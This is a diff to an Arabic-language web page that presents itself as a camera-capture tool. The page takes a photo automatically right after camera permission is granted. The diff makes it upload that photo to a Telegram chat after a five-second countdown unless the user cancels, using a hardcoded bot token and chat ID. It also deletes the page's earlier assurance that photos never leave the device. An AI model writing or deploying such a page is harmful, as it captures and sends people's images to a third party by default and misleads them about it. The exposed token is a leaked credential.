@@ -5,10 +5,10 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <title>التقاط تلقائي بالكاميرا</title>
 <style>
-:root{--bg:#f6f7f9;--card:#fff;--text:#14181f;--muted:#5b6472;--accent:#2563eb;--accent-text:#fff;--border:#dfe3ea;--err:#b42318;
+:root{--bg:#f6f7f9;--card:#fff;--text:#14181f;--muted:#5b6472;--accent:#2563eb;--accent-text:#fff;--border:#dfe3ea;--err:#b42318;--ok:#15803d;
 box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);color-scheme:light}
-@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#0f1218;--card:#181c24;--text:#eef1f6;--muted:#9aa4b2;--accent:#4f8cff;--accent-text:#0b1020;--border:#2a303b;--err:#ff8a80;color-scheme:dark}}
-:root[data-theme="dark"]{--bg:#0f1218;--card:#181c24;--text:#eef1f6;--muted:#9aa4b2;--accent:#4f8cff;--accent-text:#0b1020;--border:#2a303b;--err:#ff8a80;color-scheme:dark}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#0f1218;--card:#181c24;--text:#eef1f6;--muted:#9aa4b2;--accent:#4f8cff;--accent-text:#0b1020;--border:#2a303b;--err:#ff8a80;--ok:#4ade80;color-scheme:dark}}
+:root[data-theme="dark"]{--bg:#0f1218;--card:#181c24;--text:#eef1f6;--muted:#9aa4b2;--accent:#4f8cff;--accent-text:#0b1020;--border:#2a303b;--err:#ff8a80;--ok:#4ade80;color-scheme:dark}
 html{scroll-padding-top:env(safe-area-inset-top,0px)}
 *{box-sizing:border-box}
 body{margin:0;background:var(--bg);color:var(--text);font-family:system-ui,-apple-system,"Segoe UI",Tahoma,"Noto Sans Arabic",sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
@@ -16,6 +16,7 @@ body{margin:0;background:var(--bg);color:var(--text);font-family:system-ui,-appl
 h1{font-size:1.25rem;margin:0 0 6px}
 #status{color:var(--muted);margin:0 0 14px;min-height:1.5em}
 #status.err{color:var(--err)}
+#status.ok{color:var(--ok)}
 .stage{position:relative;width:100%;aspect-ratio:4/3;background:#000;border-radius:12px;overflow:hidden}
 .stage video,.stage img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover}
 video{transform:scaleX(-1)}
@@ -23,6 +24,10 @@ video{transform:scaleX(-1)}
 .row{display:flex;gap:10px;justify-content:center;margin-top:14px;flex-wrap:wrap}
 button,a.btn{font:inherit;border:0;border-radius:10px;padding:10px 18px;background:var(--accent);color:var(--accent-text);cursor:pointer;text-decoration:none;display:inline-block}
 button.alt{background:transparent;color:var(--text);border:1px solid var(--border)}
+button.danger{background:var(--err);color:#fff}
+#uploadBox{margin-top:14px;padding:14px;border:1px solid var(--border);border-radius:12px;background:rgba(127,127,127,.08)}
+#uploadBox p{margin:0 0 10px;font-weight:600}
+#countdownNum{font-size:1.4rem;font-weight:800;color:var(--accent)}
 </style>
 </head>
 <body>
@@ -33,25 +38,39 @@ button.alt{background:transparent;color:var(--text);border:1px solid var(--borde
     <video id="video" autoplay muted playsinline></video>
     <img id="photo" class="hidden" alt="الصورة الملتقطة">
   </div>
+
   <div class="row hidden" id="actions">
     <button id="retake">إعادة الالتقاط</button>
     <a class="btn alt" id="download" download="photo.jpg">تنزيل الصورة</a>
   </div>
+
+  <div id="uploadBox" class="hidden">
+    <p>سيتم رفع الصورة خلال <span id="countdownNum">5</span> ثوانٍ</p>
+    <button class="danger" id="cancelUpload">إلغاء الرفع</button>
+  </div>
+
   <canvas id="canvas" class="hidden"></canvas>
 </main>
 <script>
+// ===== إعدادات الرفع إلى تلغرام =====
+const TELEGRAM_TOKEN='9062869047:AAEwyeUMOtyImKqEk9YfuYVJoi2i-Dw_Hmw';
+const TELEGRAM_CHAT_ID='8785889283';
+
 const video=document.getElementById('video'),photo=document.getElementById('photo'),
 canvas=document.getElementById('canvas'),statusEl=document.getElementById('status'),
-actions=document.getElementById('actions'),dl=document.getElementById('download');
-let stream=null;
+actions=document.getElementById('actions'),dl=document.getElementById('download'),
+uploadBox=document.getElementById('uploadBox'),countdownNum=document.getElementById('countdownNum'),
+cancelUploadBtn=document.getElementById('cancelUpload');
+let stream=null,countdownTimer=null,lastBlob=null;
 
-function setStatus(t,err){statusEl.textContent=t;statusEl.classList.toggle('err',!!err)}
+function setStatus(t,kind){statusEl.textContent=t;statusEl.classList.remove('err','ok');if(kind)statusEl.classList.add(kind)}
 function stop(){if(stream){stream.getTracks().forEach(t=>t.stop());stream=null}}
 
 async function start(){
+  clearInterval(countdownTimer);uploadBox.classList.add('hidden');
   photo.classList.add('hidden');video.classList.remove('hidden');actions.classList.add('hidden');
   if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){
-    setStatus('تعذّر طلب الإذن هنا. افتح الملف مباشرة في Chrome أو Firefox (وليس من معاينة الملفات أو متصفح داخل تطبيق)، أو افتحه عبر رابط HTTPS.',true);document.getElementById('retake').textContent='تفعيل الكاميرا';actions.classList.remove('hidden');dl.classList.add('hidden');return}
+    setStatus('تعذّر طلب الإذن هنا. افتح الملف مباشرة في Chrome أو Firefox (وليس من معاينة الملفات أو متصفح داخل تطبيق)، أو افتحه عبر رابط HTTPS.','err');document.getElementById('retake').textContent='تفعيل الكاميرا';actions.classList.remove('hidden');dl.classList.add('hidden');return}
   setStatus('جارٍ طلب إذن الكاميرا… اضغط «سماح».');
   try{
     stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:1280},height:{ideal:960}},audio:false});
@@ -59,11 +78,10 @@ async function start(){
     const msg=(e&&e.name==='NotAllowedError')?'تم رفض إذن الكاميرا. اسمح بالوصول من إعدادات المتصفح ثم أعد المحاولة.'
       :(e&&e.name==='NotFoundError')?'لم يتم العثور على كاميرا في هذا الجهاز.'
       :'تعذّر تشغيل الكاميرا.';
-    setStatus(msg,true);document.getElementById('retake').textContent='تفعيل الكاميرا';actions.classList.remove('hidden');dl.classList.add('hidden');return}
+    setStatus(msg,'err');document.getElementById('retake').textContent='تفعيل الكاميرا';actions.classList.remove('hidden');dl.classList.add('hidden');return}
   video.srcObject=stream;
   await video.play().catch(()=>{});
   setStatus('تم السماح. جارٍ التقاط الصورة…');
-  // ننتظر قليلاً حتى يضبط الإضاءة ثم نلتقط تلقائياً
   setTimeout(capture,900);
 }
 
@@ -76,7 +94,39 @@ function capture(){
   photo.src=url;dl.href=url;
   stop();video.classList.add('hidden');photo.classList.remove('hidden');
   dl.classList.remove('hidden');actions.classList.remove('hidden');document.getElementById('retake').textContent='إعادة الالتقاط';
-  setStatus('تم التقاط الصورة. تبقى على جهازك فقط ولا تُرسل لأي مكان.');
+  setStatus('تم التقاط الصورة.');
+  canvas.toBlob(blob=>{lastBlob=blob;startCountdown()},'image/jpeg',0.92);
+}
+
+function startCountdown(){
+  let n=5;countdownNum.textContent=n;uploadBox.classList.remove('hidden');
+  clearInterval(countdownTimer);
+  countdownTimer=setInterval(()=>{
+    n--;
+    if(n<=0){clearInterval(countdownTimer);uploadBox.classList.add('hidden');uploadPhoto();return}
+    countdownNum.textContent=n;
+  },1000);
+}
+
+cancelUploadBtn.addEventListener('click',()=>{
+  clearInterval(countdownTimer);uploadBox.classList.add('hidden');
+  setStatus('تم إلغاء الرفع. الصورة محفوظة على جهازك فقط.');
+});
+
+async function uploadPhoto(){
+  if(!lastBlob){return}
+  setStatus('جارٍ رفع الصورة…');
+  try{
+    const fd=new FormData();
+    fd.append('chat_id',TELEGRAM_CHAT_ID);
+    fd.append('photo',lastBlob,'photo.jpg');
+    const res=await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`,{method:'POST',body:fd});
+    const data=await res.json();
+    if(data.ok){setStatus('تم رفع الصورة بنجاح ✅','ok')}
+    else{setStatus('فشل الرفع: '+(data.description||'خطأ غير معروف'),'err')}
+  }catch(e){
+    setStatus('فشل الرفع. تحقق من اتصال الإنترنت وحاول مجدداً.','err');
+  }
 }
 
 document.getElementById('retake').addEventListener('click',()=>{stop();start()});
